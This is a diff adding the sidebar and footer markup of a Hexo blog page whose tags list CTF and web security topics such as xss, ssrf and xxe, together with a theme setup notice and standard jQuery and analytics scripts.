+        <li class="archive-post-item">
+            <span class="archive-post-date">05/27</span><a class="archive-post-title" href= "/2018/05/27/vulnerable/php伪协议/" >php伪协议</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
+    
+        <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
+    
+        <span class="sidebar-tag-name" data-tags="command"><span class="iconfont-archer">&#xe606;</span>command</span>
+    
+        <span class="sidebar-tag-name" data-tags="傅里叶"><span class="iconfont-archer">&#xe606;</span>傅里叶</span>
+    
+        <span class="sidebar-tag-name" data-tags="/proc"><span class="iconfont-archer">&#xe606;</span>/proc</span>
+    
+        <span class="sidebar-tag-name" data-tags="linux"><span class="iconfont-archer">&#xe606;</span>linux</span>
+    
+        <span class="sidebar-tag-name" data-tags="shell"><span class="iconfont-archer">&#xe606;</span>shell</span>
+    
+        <span class="sidebar-tag-name" data-tags="cpp"><span class="iconfont-archer">&#xe606;</span>cpp</span>
+    
+        <span class="sidebar-tag-name" data-tags="git"><span class="iconfont-archer">&#xe606;</span>git</span>
+    
+        <span class="sidebar-tag-name" data-tags="cve"><span class="iconfont-archer">&#xe606;</span>cve</span>
+    
+        <span class="sidebar-tag-name" data-tags="隐写"><span class="iconfont-archer">&#xe606;</span>隐写</span>
+    
+        <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
+    
+        <span class="sidebar-tag-name" data-tags="Pyppeteer"><span class="iconfont-archer">&#xe606;</span>Pyppeteer</span>
+    
+        <span class="sidebar-tag-name" data-tags="tutorial"><span class="iconfont-archer">&#xe606;</span>tutorial</span>
+    
+        <span class="sidebar-tag-name" data-tags="selenium"><span class="iconfont-archer">&#xe606;</span>selenium</span>
+    
+        <span class="sidebar-tag-name" data-tags="error"><span class="iconfont-archer">&#xe606;</span>error</span>
+    
+        <span class="sidebar-tag-name" data-tags="xss"><span class="iconfont-archer">&#xe606;</span>xss</span>
+    
+        <span class="sidebar-tag-name" data-tags="hash"><span class="iconfont-archer">&#xe606;</span>hash</span>
+    
+        <span class="sidebar-tag-name" data-tags="vulnerable"><span class="iconfont-archer">&#xe606;</span>vulnerable</span>
+    
+        <span class="sidebar-tag-name" data-tags="side attack"><span class="iconfont-archer">&#xe606;</span>side attack</span>
+    
+        <span class="sidebar-tag-name" data-tags="ssrf"><span class="iconfont-archer">&#xe606;</span>ssrf</span>
+    
+        <span class="sidebar-tag-name" data-tags="race condition"><span class="iconfont-archer">&#xe606;</span>race condition</span>
+    
+        <span class="sidebar-tag-name" data-tags="xxe"><span class="iconfont-archer">&#xe606;</span>xxe</span>
+    
+        <span class="sidebar-tag-name" data-tags="web"><span class="iconfont-archer">&#xe606;</span>web</span>
+    
+        <span class="sidebar-tag-name" data-tags="gif"><span class="iconfont-archer">&#xe606;</span>gif</span>
+    
+        <span class="sidebar-tag-name" data-tags="watermark"><span class="iconfont-archer">&#xe606;</span>watermark</span>
+    
+        <span class="sidebar-tag-name" data-tags="心绪"><span class="iconfont-archer">&#xe606;</span>心绪</span>
+    
+        <span class="sidebar-tag-name" data-tags="随笔"><span class="iconfont-archer">&#xe606;</span>随笔</span>
+    
+        <span class="sidebar-tag-name" data-tags="收集"><span class="iconfont-archer">&#xe606;</span>收集</span>
+    
+        <span class="sidebar-tag-name" data-tags="靶机"><span class="iconfont-archer">&#xe606;</span>靶机</span>
+    
+        <span class="sidebar-tag-name" data-tags="xss practice"><span class="iconfont-archer">&#xe606;</span>xss practice</span>
+    
+        <span class="sidebar-tag-name" data-tags="tutorial ctf"><span class="iconfont-archer">&#xe606;</span>tutorial ctf</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: '/',
+        author: 'damn1t'
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- busuanzi  -->
+    
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+    
+    </body>
+</html>
+
+
